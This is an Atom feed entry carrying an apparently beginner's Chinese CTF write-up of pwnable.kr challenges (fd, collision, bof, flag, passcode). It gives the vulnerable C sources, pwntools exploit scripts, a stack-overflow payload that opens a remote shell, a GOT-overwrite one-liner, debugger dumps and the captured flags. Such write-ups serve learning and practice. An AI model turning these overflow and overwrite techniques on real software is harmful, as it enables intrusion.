    <link href="https://prontosil.club/2019/07/24/pwnable/"/>
    <id>https://prontosil.club/2019/07/24/pwnable/</id>
    <published>2019-07-24T12:46:03.000Z</published>
    <updated>2019-07-24T12:49:36.285Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pwnable从小白开始"><a href="#pwnable从小白开始" class="headerlink" title="pwnable从小白开始"></a>pwnable从小白开始</h1><p>pwnable是一个适合小白的网站</p><p><a href="https://pwnable.kr/play.php" target="_blank" rel="noopener">https://pwnable.kr/play.php</a></p><h2 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h2><p>有源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">32</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"pass argv[1] a number\n"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;</span><br><span class="line">        <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">        len = read(fd, buf, <span class="number">32</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">"LETMEWIN\n"</span>, buf))&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"good job :)\n"</span>);</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"learn about Linux file IO\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题目是让你了解Linux下的文件描述符<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fd@prowl:~$ ./fd 4660</span><br><span class="line">LETMEWIN</span><br><span class="line">good job :)</span><br><span class="line">mommy! I think I know what a file descriptor is!!</span><br><span class="line">fd@prowl:~$</span><br></pre></td></tr></table></figure></p><h2 id="collision"><a href="#collision" class="headerlink" title="collision"></a>collision</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> hashcode = <span class="number">0x21DD09EC</span>;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">check_password</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* p)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span>* ip = (<span class="keyword">int</span>*)p;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">                res += ip[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"usage : %s [passcode]\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"passcode length should be 20 bytes\n"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"wrong passcode.\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>果然我还是小白，连最基本的常识都不懂了，意识到了是由输入的<code>argv[1]</code>来计算的，20个字节正好分成5次，就是把每四个加起来就行了。</p><p>所以可以直接拿<code>0x21DD09EC</code>去除掉5就好了<br>exp如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">pwn_ssh=ssh(host=<span class="string">'pwnable.kr'</span>,user=<span class="string">'col'</span>,password=<span class="string">'guest'</span>,port=<span class="number">2222</span>)</span><br><span class="line">print(pwn_ssh.connected())</span><br><span class="line"></span><br><span class="line">sh=pwn_ssh.process(argv=[<span class="string">'collision'</span>,<span class="string">'\xc9\xce\xc5\x06'</span>*<span class="number">4</span>+<span class="string">'\xc8\xce\xc5\x06'</span>],executable=<span class="string">'./col'</span>)</span><br><span class="line">print(sh.recvall())</span><br></pre></td></tr></table></figure></p><p>这里还学到了一波用<code>pwn</code>ssh连接的。</p><h2 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h2><p>源码：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> overflowme[<span class="number">32</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"overflow me : "</span>);</span><br><span class="line">gets(overflowme);<span class="comment">// smash me!</span></span><br><span class="line"><span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Nah..\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">func(<span class="number">0xdeadbeef</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这是一个简单的栈溢出的题目<br>虽然简单，但是小白还是要仔细地分析一下的。</p><p>func对应的汇编代码，其实感觉汇编代码看的更明白一些：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.text:565D262C func            proc near               ; CODE XREF: main+10p</span><br><span class="line">.text:565D262C</span><br><span class="line">.text:565D262C s               = byte ptr -2Ch</span><br><span class="line">.text:565D262C var_C           = dword ptr -0Ch</span><br><span class="line">.text:565D262C arg_0           = dword ptr  8</span><br><span class="line">.text:565D262C</span><br><span class="line">.text:565D262C                 push    ebp</span><br><span class="line">.text:565D262D                 mov     ebp, esp</span><br><span class="line">.text:565D262F                 sub     esp, 48h</span><br><span class="line">.text:565D2632                 mov     eax, large gs:14h ;gs保护机制</span><br><span class="line">.text:565D2638                 mov     [ebp+var_C], eax</span><br><span class="line">.text:565D263B                 xor     eax, eax</span><br><span class="line">.text:565D263D                 mov     dword ptr [esp], offset s ; &quot;overflow me : &quot;</span><br><span class="line">.text:565D2644                 call    near ptr puts+565D2649h</span><br><span class="line">.text:565D2649                 lea     eax, [ebp+s]</span><br><span class="line">.text:565D264C                 mov     [esp], eax      ; s</span><br><span class="line">.text:565D264F                 call    near ptr gets+565D2654h</span><br><span class="line">.text:565D2654                 cmp     [ebp+arg_0], 0CAFEBABEh</span><br><span class="line">.text:565D265B                 jnz     short loc_565D266B</span><br><span class="line">.text:565D265D                 mov     dword ptr [esp], offset command ; &quot;/bin/sh&quot;</span><br><span class="line">.text:565D2664                 call    near ptr system+565D2669h</span><br><span class="line">.text:565D2669                 jmp     short loc_565D2677</span><br></pre></td></tr></table></figure></p><p>之前一直不太明白如果局部变量是数组该怎么搞</p><p>关键是这里：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:565D2649                 lea     eax, [ebp+s]</span><br><span class="line">.text:565D264C                 mov     [esp], eax      ; s</span><br></pre></td></tr></table></figure></p><p>注意<br><code>lea  eax, [ebp+s]</code><br>这里加了方括号但是其实还是地址，就是将字符串s的地址赋值给eax<br>然后再将其存放到栈顶，之后调用<code>gets</code>函数，将输入的值填入到缓冲区</p><p>从这张图就能明白内存的分布了<br><img src="/assets/stack2_l89iia1d5.png" alt="stack2"><br>这道题目保护机制基本都开了，但是我们并不需要执行代码。只需要覆盖栈上的值就行了。也不会触发gs保护机制</p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">52</span>+<span class="string">'\xbe\xba\xfe\xca'</span></span><br><span class="line">r=remote(<span class="string">'pwnable.kr'</span>,<span class="number">9000</span>)</span><br><span class="line">print(r.connected())</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>运行效果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pxy@ubuntu:~/pwnable$ python bofexp.py</span><br><span class="line">[+] Opening connection to pwnable.kr on port 9000: Done</span><br><span class="line">True</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ ls</span><br><span class="line">bof</span><br><span class="line">bof.c</span><br><span class="line">flag</span><br><span class="line">log</span><br><span class="line">log2</span><br><span class="line">super.pl</span><br><span class="line">$ cat flag</span><br><span class="line">daddy, I just pwned a buFFer :)</span><br></pre></td></tr></table></figure><h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p>这道题目被upx加壳，Linux下的加壳倒还是第一次遇到。</p><p>到<a href="https://github.com/upx/upx/releases/tag/v3.95" target="_blank" rel="noopener">这里</a>可以找到脱壳的工具</p><p>脱壳之后gdb载入，查看反汇编代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; disassemble main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x0000000000401164 &lt;+0&gt;:push   rbp</span><br><span class="line">   0x0000000000401165 &lt;+1&gt;:mov    rbp,rsp</span><br><span class="line">   0x0000000000401168 &lt;+4&gt;:sub    rsp,0x10</span><br><span class="line">   0x000000000040116c &lt;+8&gt;:mov    edi,0x496658</span><br><span class="line">   0x0000000000401171 &lt;+13&gt;:call   0x402080 &lt;puts&gt;</span><br><span class="line">   0x0000000000401176 &lt;+18&gt;:mov    edi,0x64</span><br><span class="line">   0x000000000040117b &lt;+23&gt;:call   0x4099d0 &lt;malloc&gt;</span><br><span class="line">   0x0000000000401180 &lt;+28&gt;:mov    QWORD PTR [rbp-0x8],rax</span><br><span class="line">   0x0000000000401184 &lt;+32&gt;:mov    rdx,QWORD PTR [rip+0x2c0ee5]        # 0x6c2070 &lt;flag&gt;</span><br><span class="line">   0x000000000040118b &lt;+39&gt;:mov    rax,QWORD PTR [rbp-0x8]</span><br><span class="line">   0x000000000040118f &lt;+43&gt;:mov    rsi,rdx</span><br><span class="line">   0x0000000000401192 &lt;+46&gt;:mov    rdi,rax</span><br><span class="line">   0x0000000000401195 &lt;+49&gt;:call   0x400320</span><br><span class="line">   0x000000000040119a &lt;+54&gt;:mov    eax,0x0</span><br><span class="line">   0x000000000040119f &lt;+59&gt;:leave  </span><br><span class="line">   0x00000000004011a0 &lt;+60&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line">pwndbg&gt; b *0x0000000000401184</span><br></pre></td></tr></table></figure><p>然后在此处下断点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">RAX  0x6c96b0 ◂— 0x0</span><br><span class="line">RBX  0x401ae0 (__libc_csu_fini) ◂— push   rbx</span><br><span class="line">RCX  0x8</span><br><span class="line">RDX  0x496628 ◂— push   rbp /* &apos;UPX...? sounds like a delivery service :)&apos; */</span><br><span class="line">RDI  0x4</span><br><span class="line">RSI  0x0</span><br><span class="line">R8   0x1</span><br><span class="line">R9   0x3</span><br><span class="line">R10  0x22</span><br></pre></td></tr></table></figure><p>命中断点之后单步一次就行<br>这时候就看到寄存器的变化</p><p>flag就是那个拉2333</p><h2 id="paascode"><a href="#paascode" class="headerlink" title="paascode"></a>paascode</h2><p>学到了一点从远程服务器下载东西的命令</p><p><code>$ scp -P 2222 passcode@pwnable.kr:/home/passcode/passcode .</code></p><p>源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">$ cat passcode.c             </span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">login</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> passcode1;</span><br><span class="line"><span class="keyword">int</span> passcode2;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"enter passcode1 : "</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode1);</span><br><span class="line">fflush(<span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"enter passcode2 : "</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode2);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"checking...\n"</span>);</span><br><span class="line"><span class="keyword">if</span>(passcode1==<span class="number">338150</span> &amp;&amp; passcode2==<span class="number">13371337</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Login OK!\n"</span>);</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Login Failed!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">welcome</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> name[<span class="number">100</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"enter you name : "</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%100s"</span>, name);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Welcome %s!\n"</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Toddler's Secure Login System 1.0 beta.\n"</span>);</span><br><span class="line"></span><br><span class="line">welcome();</span><br><span class="line">login();</span><br><span class="line"></span><br><span class="line"><span class="comment">// something after login...</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Now I can safely trust you that you have credential :)\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>作为一名小白还是要好好地分析栈帧的构造</p><p>那要怎么分析程序呢？最关键的还是分析程序的交互过程，毕竟我们也是从程序的输入入手的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  0x804862a &lt;welcome+33&gt;    mov    eax, 0x80487dd</span><br><span class="line">  0x804862f &lt;welcome+38&gt;    lea    edx, [ebp - 0x70]</span><br><span class="line">► 0x8048632 &lt;welcome+41&gt;    mov    dword ptr [esp + 4], edx</span><br><span class="line">  0x8048636 &lt;welcome+45&gt;    mov    dword ptr [esp], eax</span><br><span class="line">  0x8048639 &lt;welcome+48&gt;    call   __isoc99_scanf@plt &lt;0x80484a0&gt;</span><br></pre></td></tr></table></figure><p>此处是调用<code>scanf</code>函数的过程， 先将一个地址<code>0x80487dd</code>赋值给eax寄存器，之后将ebp-0x70的地址传给edx寄存器，注意到这里的操作符是<code>lea</code><br>之后再将edx寄存器的值放到栈的第二层，最后将eax寄存器的值放到栈顶。 所以调用scanf函数的时候，栈顶是<code>0x80487dd</code>，往下加4个字节存储的是一个局部变量开始的位置(就是字符串s的首地址)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  0x804862f &lt;welcome+38&gt;    lea    edx, [ebp - 0x70]</span><br><span class="line">  0x8048632 &lt;welcome+41&gt;    mov    dword ptr [esp + 4], edx</span><br><span class="line">  0x8048636 &lt;welcome+45&gt;    mov    dword ptr [esp], eax</span><br><span class="line">► 0x8048639 &lt;welcome+48&gt;    call   __isoc99_scanf@plt &lt;0x80484a0&gt;</span><br><span class="line">       format: 0x80487dd ◂— &apos;%100s&apos;</span><br><span class="line">       vararg: 0xff8e7068 ◂— 0x28 /* &apos;(&apos; */</span><br></pre></td></tr></table></figure><p>这是参数的传递过程<br>此时栈上的布局：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00:0000│ esp  0xff8e7050 —▸ 0x80487dd ◂— and    eax, 0x73303031 /* &apos;%100s&apos; */</span><br><span class="line">01:0004│      0xff8e7054 —▸ 0xff8e7068 ◂— 0x28 /* &apos;(&apos; */</span><br></pre></td></tr></table></figure><p>这里有一点疑惑</p><p>直接查看内存</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20x 0x80487dd</span><br><span class="line">0x80487dd:0x30303125</span><br></pre></td></tr></table></figure><p>0x30303125 其实就是%100的小端表示！！</p><p>但是换一种方式看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20i 0x80487dd</span><br><span class="line">   0x80487dd:and    eax,0x73303031</span><br><span class="line">   0x80487e2:add    BYTE PTR [edi+0x65],dl</span><br></pre></td></tr></table></figure><p>到底是数据还是指令全看程序员了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">passcode@prowl:~$ python -c &quot;print &apos;A&apos;*96+&apos;\x04\xa0\x04\x08&apos;+str(0x080485d7)&quot; | ./passcode</span><br><span class="line">Toddler&apos;s Secure Login System 1.0 beta.</span><br><span class="line">enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�!</span><br><span class="line">enter passcode1 : Login OK!</span><br><span class="line">Sorry mom.. I got confused about scanf usage :(</span><br><span class="line">Now I can safely trust you that you have credential :)</span><br></pre></td></tr></table></figure><p>不过这道题目我没有搞得很清楚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;pwnable从小白开始&quot;&gt;&lt;a href=&quot;#pwnable从小白开始&quot; class=&quot;headerlink&quot; title=&quot;pwnable从小白开始&quot;&gt;&lt;/a&gt;pwnable从小白开始&lt;/h1&gt;&lt;p&gt;pwnable是一个适合小白的网站&lt;/p&gt;
&lt;p&gt;&lt;a hr
      
    
    </summary>
    
      <category term="pwn" scheme="https://prontosil.club/categories/pwn/"/>
    
    
      <category term="wp" scheme="https://prontosil.club/tags/wp/"/>
    
      <category term="ctf" scheme="https://prontosil.club/tags/ctf/"/>
    
      <category term="pwn" scheme="https://prontosil.club/tags/pwn/"/>
    
  </entry>
  
</feed>
